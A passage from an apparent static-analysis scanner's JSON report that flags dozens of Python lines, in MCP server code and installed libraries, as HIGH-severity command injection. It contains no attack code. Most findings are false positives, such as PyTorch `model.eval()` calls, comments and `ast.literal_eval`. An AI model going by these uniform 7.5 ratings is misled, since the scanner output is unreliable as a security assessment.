            "context": "        \n        try:\n            # Use subprocess.run with explicit arguments (no shell=True)\n            process = await asyncio.create_subprocess_exec(\n                *parts,  # Unpack the safely parsed command parts\n                cwd=work_dir,\n                stdout=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "backup_agent3_20250607_010225/src/mcp/infrastructure_servers.py",
            "line": 824,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        \"\"\"Check if Docker is available.\"\"\"\n        if self.docker_available is None:\n            try:\n                process = await asyncio.create_subprocess_exec(\n                    \"docker\", \"--version\",\n                    stdout=asyncio.subprocess.PIPE,\n                    stderr=asyncio.subprocess.PIPE",
            "cvss_score": 7.5
          },
          {
            "file": "backup_agent3_20250607_010225/src/mcp/infrastructure_servers.py",
            "line": 1156,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "# Use subprocess.exec with explicit arguments (no shell=True)",
            "context": "        logger.info(f\"Executing Docker run with validated arguments: {' '.join(cmd_parts[:5])}...\")\n        \n        try:\n            # Use subprocess.exec with explicit arguments (no shell=True)\n            process = await asyncio.create_subprocess_exec(\n                *cmd_parts,\n                stdout=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "backup_agent3_20250607_010225/src/mcp/infrastructure_servers.py",
            "line": 1157,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        \n        try:\n            # Use subprocess.exec with explicit arguments (no shell=True)\n            process = await asyncio.create_subprocess_exec(\n                *cmd_parts,\n                stdout=asyncio.subprocess.PIPE,\n                stderr=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "backup_agent3_20250607_010225/src/mcp/infrastructure_servers.py",
            "line": 1269,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "# Use subprocess.exec with explicit arguments (no shell=True)",
            "context": "        logger.info(f\"Executing Docker build with validated arguments: {' '.join(cmd_parts)}\")\n        \n        try:\n            # Use subprocess.exec with explicit arguments (no shell=True)\n            process = await asyncio.create_subprocess_exec(\n                *cmd_parts,\n                stdout=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "backup_agent3_20250607_010225/src/mcp/infrastructure_servers.py",
            "line": 1270,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        \n        try:\n            # Use subprocess.exec with explicit arguments (no shell=True)\n            process = await asyncio.create_subprocess_exec(\n                *cmd_parts,\n                stdout=asyncio.subprocess.PIPE,\n                stderr=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "backup_agent3_20250607_010225/src/mcp/infrastructure_servers.py",
            "line": 1329,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        cmd = \" \".join(cmd_parts)\n        \n        try:\n            process = await asyncio.create_subprocess_exec(\n                *cmd_parts,\n                stdout=asyncio.subprocess.PIPE,\n                stderr=asyncio.subprocess.PIPE",
            "cvss_score": 7.5
          },
          {
            "file": "backup_agent3_20250607_010225/src/mcp/infrastructure_servers.py",
            "line": 1366,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "            cmd_parts.append(\"-a\")\n        \n        try:\n            process = await asyncio.create_subprocess_exec(\n                *cmd_parts,\n                stdout=asyncio.subprocess.PIPE,\n                stderr=asyncio.subprocess.PIPE",
            "cvss_score": 7.5
          },
          {
            "file": "backup_agent3_20250607_010225/src/mcp/infrastructure_servers.py",
            "line": 1441,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        \"\"\"Check if kubectl is available.\"\"\"\n        if self.kubectl_available is None:\n            try:\n                process = await asyncio.create_subprocess_exec(\n                    \"kubectl\", \"version\", \"--client\",\n                    stdout=asyncio.subprocess.PIPE,\n                    stderr=asyncio.subprocess.PIPE",
            "cvss_score": 7.5
          },
          {
            "file": "backup_agent3_20250607_010225/src/mcp/infrastructure_servers.py",
            "line": 1688,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "# Use subprocess.exec with explicit arguments (no shell=True)",
            "context": "        logger.info(f\"Executing kubectl apply with validated arguments: {' '.join(cmd_parts)}\")\n        \n        try:\n            # Use subprocess.exec with explicit arguments (no shell=True)\n            process = await asyncio.create_subprocess_exec(\n                *cmd_parts,\n                stdout=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "backup_agent3_20250607_010225/src/mcp/infrastructure_servers.py",
            "line": 1689,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        \n        try:\n            # Use subprocess.exec with explicit arguments (no shell=True)\n            process = await asyncio.create_subprocess_exec(\n                *cmd_parts,\n                stdout=asyncio.subprocess.PIPE,\n                stderr=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "backup_agent3_20250607_010225/src/mcp/infrastructure_servers.py",
            "line": 1736,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        cmd = \" \".join(cmd_parts)\n        \n        try:\n            process = await asyncio.create_subprocess_exec(\n                *cmd_parts,\n                stdout=asyncio.subprocess.PIPE,\n                stderr=asyncio.subprocess.PIPE",
            "cvss_score": 7.5
          },
          {
            "file": "backup_agent3_20250607_010225/src/mcp/infrastructure_servers.py",
            "line": 1777,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        cmd = \" \".join(cmd_parts)\n        \n        try:\n            process = await asyncio.create_subprocess_exec(\n                *cmd_parts,\n                stdout=asyncio.subprocess.PIPE,\n                stderr=asyncio.subprocess.PIPE",
            "cvss_score": 7.5
          },
          {
            "file": "backup_agent3_20250607_010225/src/mcp/infrastructure_servers.py",
            "line": 1815,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        cmd = \" \".join(cmd_parts)\n        \n        try:\n            process = await asyncio.create_subprocess_exec(\n                *cmd_parts,\n                stdout=asyncio.subprocess.PIPE,\n                stderr=asyncio.subprocess.PIPE",
            "cvss_score": 7.5
          },
          {
            "file": "backup_agent3_20250607_010225/src/mcp/infrastructure_servers.py",
            "line": 1848,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        cmd = \" \".join(cmd_parts)\n        \n        try:\n            process = await asyncio.create_subprocess_exec(\n                *cmd_parts,\n                stdout=asyncio.subprocess.PIPE,\n                stderr=asyncio.subprocess.PIPE",
            "cvss_score": 7.5
          },
          {
            "file": "backup_agent3_20250607_010225/src/mcp/security/sast_server.py",
            "line": 225,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        cmd.append(str(path))\n        \n        try:\n            process = await asyncio.create_subprocess_exec(\n                *cmd,\n                stdout=asyncio.subprocess.PIPE,\n                stderr=asyncio.subprocess.PIPE",
            "cvss_score": 7.5
          },
          {
            "file": "backup_agent3_20250607_010225/src/mcp/security/sast_server.py",
            "line": 365,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        ]\n        \n        try:\n            process = await asyncio.create_subprocess_exec(\n                *cmd,\n                stdout=asyncio.subprocess.PIPE,\n                stderr=asyncio.subprocess.PIPE",
            "cvss_score": 7.5
          },
          {
            "file": "backup_agent3_20250607_010225/src/mcp/security/sast_server.py",
            "line": 429,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        # 1. Trufflehog\n        try:\n            cmd = [\"trufflehog\", \"filesystem\", str(path), \"--json\"]\n            process = await asyncio.create_subprocess_exec(\n                *cmd,\n                stdout=asyncio.subprocess.PIPE,\n                stderr=asyncio.subprocess.PIPE",
            "cvss_score": 7.5
          },
          {
            "file": "backup_agent3_20250607_010225/src/mcp/security/sast_server.py",
            "line": 454,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        try:\n            with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as report_file:\n                cmd = [\"gitleaks\", \"detect\", \"--source\", str(path), \"--report-format\", \"json\", \"--report-path\", report_file.name]\n                process = await asyncio.create_subprocess_exec(\n                    *cmd,\n                    stdout=asyncio.subprocess.PIPE,\n                    stderr=asyncio.subprocess.PIPE",
            "cvss_score": 7.5
          },
          {
            "file": "backup_agent3_20250607_010225/src/mcp/security/sast_server.py",
            "line": 583,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        # Run npm audit\n        try:\n            cmd = [\"npm\", \"audit\", \"--json\"]\n            process = await asyncio.create_subprocess_exec(\n                *cmd,\n                cwd=str(path),\n                stdout=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "backup_agent3_20250607_010225/src/mcp/security/sast_server.py",
            "line": 609,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        if check_licenses:\n            try:\n                cmd = [\"license-checker\", \"--json\", \"--production\"]\n                process = await asyncio.create_subprocess_exec(\n                    *cmd,\n                    cwd=str(path),\n                    stdout=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "backup_agent3_20250607_010225/src/mcp/security/sast_server.py",
            "line": 636,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        # Run safety check\n        try:\n            cmd = [\"safety\", \"check\", \"--json\"]\n            process = await asyncio.create_subprocess_exec(\n                *cmd,\n                cwd=str(path),\n                stdout=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "backup_agent3_20250607_010225/src/mcp/security/sast_server.py",
            "line": 661,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        # Check with pip-audit\n        try:\n            cmd = [\"pip-audit\", \"--format\", \"json\"]\n            process = await asyncio.create_subprocess_exec(\n                *cmd,\n                cwd=str(path),\n                stdout=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "backup_agent3_20250607_010225/src/mcp/security/supply_chain_server.py",
            "line": 615,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "            if not include_dev:\n                cmd.append(\"--production\")\n            \n            process = await asyncio.create_subprocess_exec(\n                *cmd,\n                cwd=str(path),\n                stdout=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "backup_agent3_20250607_010225/src/mcp/security/supply_chain_server.py",
            "line": 638,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        \n        try:\n            cmd = [\"pip\", \"list\", \"--format=json\"]\n            process = await asyncio.create_subprocess_exec(\n                *cmd,\n                cwd=str(path),\n                stdout=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "backup_agent3_20250607_010225/src/mcp/security/supply_chain_server.py",
            "line": 686,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        \"\"\"Get license for Python package.\"\"\"\n        try:\n            cmd = [\"pip\", \"show\", package_name]\n            process = await asyncio.create_subprocess_exec(\n                *cmd,\n                stdout=asyncio.subprocess.PIPE,\n                stderr=asyncio.subprocess.PIPE",
            "cvss_score": 7.5
          },
          {
            "file": "backup_agent3_20250607_010225/src/mcp/infrastructure/commander_server.py",
            "line": 445,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "            command_parts = shlex.split(command)\n            \n            # Create subprocess with resource limits - NO SHELL=True for security\n            process = await asyncio.create_subprocess_exec(\n                *command_parts,\n                cwd=work_dir,\n                stdout=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/learning_core/prediction_engine.py",
            "line": 544,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.model.eval()",
            "context": "        x = torch.FloatTensor(features)\n        \n        # Make prediction\n        self.model.eval()\n        with torch.no_grad():\n            output = self.model(x)\n            ",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/learning_core/prediction_engine.py",
            "line": 691,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.lstm_model.eval()",
            "context": "        x = torch.FloatTensor(features)\n        \n        # Get predictions from both models\n        self.lstm_model.eval()\n        self.transformer_model.eval()\n        \n        with torch.no_grad():",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/learning_core/prediction_engine.py",
            "line": 692,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.transformer_model.eval()",
            "context": "        \n        # Get predictions from both models\n        self.lstm_model.eval()\n        self.transformer_model.eval()\n        \n        with torch.no_grad():\n            lstm_output = self.lstm_model(x)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/learning_core/prediction_engine.py",
            "line": 756,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.gnn_model.eval()",
            "context": "        x = torch.FloatTensor(features)\n        \n        # Make prediction\n        self.gnn_model.eval()\n        with torch.no_grad():\n            output = self.gnn_model(x)\n        ",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/learning_core/prediction_engine.py",
            "line": 931,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.meta_model.eval()",
            "context": "        # Use meta-model\n        x = torch.FloatTensor(features).unsqueeze(0)\n        \n        self.meta_model.eval()\n        with torch.no_grad():\n            output = self.meta_model(x)\n        ",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/servers/bash_god/optimization/engine.py",
            "line": 296,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "cpu_cores = int(subprocess.check_output(\"nproc\", shell=True, text=True).strip())",
            "context": "        \"\"\"Detect system capabilities\"\"\"\n        try:\n            # CPU cores\n            cpu_cores = int(subprocess.check_output(\"nproc\", shell=True, text=True).strip())\n            \n            # Memory (approximate)\n            try:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/servers/bash_god/optimization/engine.py",
            "line": 300,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "memory_info = subprocess.check_output(\"free -g | grep Mem:\", shell=True, text=True)",
            "context": "            \n            # Memory (approximate)\n            try:\n                memory_info = subprocess.check_output(\"free -g | grep Mem:\", shell=True, text=True)\n                memory_gb = float(memory_info.split()[1])\n            except:\n                memory_gb = 4.0  # Default assumption",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/six.py",
            "line": 740,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(\"\"\"exec _code_ in _globs_, _locs_\"\"\")",
            "context": "            del frame\n        elif _locs_ is None:\n            _locs_ = _globs_\n        exec(\"\"\"exec _code_ in _globs_, _locs_\"\"\")\n\n    exec_(\"\"\"def reraise(tp, value, tb=None):\n    try:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/threadpoolctl.py",
            "line": 1286,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(options.command)",
            "context": "            print(\"WARNING: could not import\", module, file=sys.stderr)\n\n    if options.command:\n        exec(options.command)\n\n    print(json.dumps(threadpool_info(), indent=2))\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/psutil/__init__.py",
            "line": 1910,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "retrieval (Linux only) a list of frequencies is returned for",
            "context": "        min and max frequency expressed in Mhz.\n\n        If *percpu* is True and the system supports per-cpu frequency\n        retrieval (Linux only) a list of frequencies is returned for\n        each CPU. If not a list with one element is returned.\n        \"\"\"\n        ret = _psplatform.cpu_freq()",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pyparsing/results.py",
            "line": 62,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "print(f\"{s} -> {fn(eval(s))}\")",
            "context": "        result = date_str.parse_string(\"1999/12/31\")\n\n        def test(s, fn=repr):\n            print(f\"{s} -> {fn(eval(s))}\")\n        test(\"list(result)\")\n        test(\"result[0]\")\n        test(\"result['month']\")",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/PIL/ImageShow.py",
            "line": 120,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "os.system(self.get_command(path, **options))  # nosec",
            "context": "        \"\"\"\n        if not os.path.exists(path):\n            raise FileNotFoundError\n        os.system(self.get_command(path, **options))  # nosec\n        return 1\n\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/PIL/ImageMath.py",
            "line": 236,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def lambda_eval(",
            "context": "}\n\n\ndef lambda_eval(\n    expression: Callable[[dict[str, Any]], Any],\n    options: dict[str, Any] = {},\n    **kw: Any,",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/PIL/ImageMath.py",
            "line": 278,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def unsafe_eval(",
            "context": "        return out\n\n\ndef unsafe_eval(\n    expression: str,\n    options: dict[str, Any] = {},\n    **kw: Any,",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/PIL/ImageMath.py",
            "line": 284,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "Evaluates an image expression. This uses Python's ``eval()`` function to process",
            "context": "    **kw: Any,\n) -> Any:\n    \"\"\"\n    Evaluates an image expression. This uses Python's ``eval()`` function to process\n    the expression string, and carries the security risks of doing so. It is not\n    recommended to process expressions without considering this.\n    :py:meth:`~lambda_eval` is a more secure alternative.",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/PIL/ImageMath.py",
            "line": 335,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "out = builtins.eval(expression, {\"__builtins\": {\"abs\": abs}}, args)",
            "context": "                raise ValueError(msg)\n\n    scan(compiled_code)\n    out = builtins.eval(expression, {\"__builtins\": {\"abs\": abs}}, args)\n    try:\n        return out.im\n    except AttributeError:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/PIL/ImageMath.py",
            "line": 342,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def eval(",
            "context": "        return out\n\n\ndef eval(\n    expression: str,\n    _dict: dict[str, Any] = {},\n    **kw: Any,",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/PIL/ImageMath.py",
            "line": 350,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "Deprecated. Use lambda_eval() or unsafe_eval() instead.",
            "context": "    \"\"\"\n    Evaluates an image expression.\n\n    Deprecated. Use lambda_eval() or unsafe_eval() instead.\n\n    :param expression: A string containing a Python-style expression.\n    :param _dict: Values to add to the evaluation context.  You",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/PIL/ImageMath.py",
            "line": 350,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "Deprecated. Use lambda_eval() or unsafe_eval() instead.",
            "context": "    \"\"\"\n    Evaluates an image expression.\n\n    Deprecated. Use lambda_eval() or unsafe_eval() instead.\n\n    :param expression: A string containing a Python-style expression.\n    :param _dict: Values to add to the evaluation context.  You",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/PIL/ImageMath.py",
            "line": 368,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "return unsafe_eval(expression, _dict, **kw)",
            "context": "        12,\n        \"ImageMath.lambda_eval or ImageMath.unsafe_eval\",\n    )\n    return unsafe_eval(expression, _dict, **kw)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/PIL/GifImagePlugin.py",
            "line": 726,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "mask = ImageMath.lambda_eval(",
            "context": "                        fill = Image.new(\"P\", delta.size, encoderinfo[\"transparency\"])\n                        if delta.mode == \"RGBA\":\n                            r, g, b, a = delta.split()\n                            mask = ImageMath.lambda_eval(\n                                lambda args: args[\"convert\"](\n                                    args[\"max\"](\n                                        args[\"max\"](",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/PIL/GifImagePlugin.py",
            "line": 748,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "mask = ImageMath.lambda_eval(",
            "context": "                                delta_l = Image.new(\"L\", delta.size)\n                                delta_l.putdata(delta.getdata())\n                                delta = delta_l\n                            mask = ImageMath.lambda_eval(\n                                lambda args: args[\"convert\"](args[\"im\"] * 255, \"1\"),\n                                im=delta,\n                            )",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/PIL/Image.py",
            "line": 3634,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def eval(image: Image, *args: Callable[[int], float]) -> Image:",
            "context": "    return image\n\n\ndef eval(image: Image, *args: Callable[[int], float]) -> Image:\n    \"\"\"\n    Applies the function (which should take one argument) to each pixel\n    in the given image. If the image has more than one band, the same",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/joblib/parallel.py",
            "line": 1749,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def _wait_retrieval(self):",
            "context": "            for result in batched_results:\n                yield result\n\n    def _wait_retrieval(self):\n        \"\"\"Return True if we need to continue retrieving some tasks.\"\"\"\n\n        # If the input load is still being iterated over, it means that tasks",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/joblib/parallel.py",
            "line": 1778,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "while self._wait_retrieval():",
            "context": "\n    def _retrieve(self):\n        timeout_control_job = None\n        while self._wait_retrieval():\n            # If the callback thread of a worker has signaled that its task\n            # triggered an exception, or if the retrieval loop has raised an\n            # exception (e.g. `GeneratorExit`), exit the loop and surface the",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/joblib/memory.py",
            "line": 178,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "(namely eval(repr(memorized_instance)) works).",
            "context": "    func: function or str\n        function whose output is cached. The string case is intended only for\n        instantiation based on the output of repr() on another instance.\n        (namely eval(repr(memorized_instance)) works).\n\n    argument_hash: str\n        hash of the function arguments.",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/joblib/memory.py",
            "line": 1179,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def eval(self, func, *args, **kwargs):",
            "context": "        # Defers the actual limits enforcing to the store backend.\n        self.store_backend.enforce_store_limits(bytes_limit, items_limit, age_limit)\n\n    def eval(self, func, *args, **kwargs):\n        \"\"\"Eval function func with arguments `*args` and `**kwargs`,\n        in the context of the memory.\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/packaging/_parser.py",
            "line": 332,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "value = ast.literal_eval(python_str)",
            "context": "\n\ndef process_python_str(python_str: str) -> Value:\n    value = ast.literal_eval(python_str)\n    return Value(str(value))\n\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/rcsetup.py",
            "line": 347,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "color = ast.literal_eval(s)",
            "context": "\n    # If it is still valid, it must be a tuple (as a string from matplotlibrc).\n    try:\n        color = ast.literal_eval(s)\n    except (SyntaxError, ValueError):\n        pass\n    else:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/rcsetup.py",
            "line": 485,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "ls = ast.literal_eval(ls)  # Parsing matplotlibrc.",
            "context": "        except ValueError:\n            pass\n        try:\n            ls = ast.literal_eval(ls)  # Parsing matplotlibrc.\n        except (SyntaxError, ValueError):\n            pass  # Will error with the ValueError at the end.\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/rcsetup.py",
            "line": 802,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "loc = ast.literal_eval(loc)",
            "context": "        except ValueError:\n            pass\n        try:\n            loc = ast.literal_eval(loc)\n        except (SyntaxError, ValueError):\n            pass\n    if isinstance(loc, int):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/rcsetup.py",
            "line": 827,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "# ast.literal_eval()",
            "context": "        # I really should have read this:\n        # https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html\n        # We should replace this eval with a combo of PyParsing and\n        # ast.literal_eval()\n        try:\n            _DunderChecker().visit(ast.parse(s))\n            s = eval(s, {'cycler': cycler, '__builtins__': {}})",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/rcsetup.py",
            "line": 830,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "s = eval(s, {'cycler': cycler, '__builtins__': {}})",
            "context": "        # ast.literal_eval()\n        try:\n            _DunderChecker().visit(ast.parse(s))\n            s = eval(s, {'cycler': cycler, '__builtins__': {}})\n        except BaseException as e:\n            raise ValueError(f\"{s!r} is not a valid cycler construction: {e}\"\n                             ) from e",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/rcsetup.py",
            "line": 834,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "# Should make sure what comes from the above eval()",
            "context": "        except BaseException as e:\n            raise ValueError(f\"{s!r} is not a valid cycler construction: {e}\"\n                             ) from e\n    # Should make sure what comes from the above eval()\n    # is a Cycler object.\n    if isinstance(s, Cycler):\n        cycler_inst = s",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/rcsetup.py",
            "line": 1104,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "# cycler-object, which gets eval()'ed to create the object.",
            "context": "    \"axes.formatter.offset_threshold\": validate_int,\n    \"axes.unicode_minus\": validate_bool,\n    # This entry can be either a cycler object or a string repr of a\n    # cycler-object, which gets eval()'ed to create the object.\n    \"axes.prop_cycle\": validate_cycler,\n    # If \"data\", axes limits are set close to the data.\n    # If \"round_numbers\" axes limits are set to the nearest round numbers.",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/psutil/tests/test_connections.py",
            "line": 359,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "tcp4_addr = eval(wait_for_file(testfile, delete=True))",
            "context": "        # launch various subprocess instantiating a socket of various\n        # families and types to enrich psutil results\n        tcp4_proc = self.pyrun(tcp4_template)\n        tcp4_addr = eval(wait_for_file(testfile, delete=True))\n        udp4_proc = self.pyrun(udp4_template)\n        udp4_addr = eval(wait_for_file(testfile, delete=True))\n        if supports_ipv6():",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/psutil/tests/test_connections.py",
            "line": 361,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "udp4_addr = eval(wait_for_file(testfile, delete=True))",
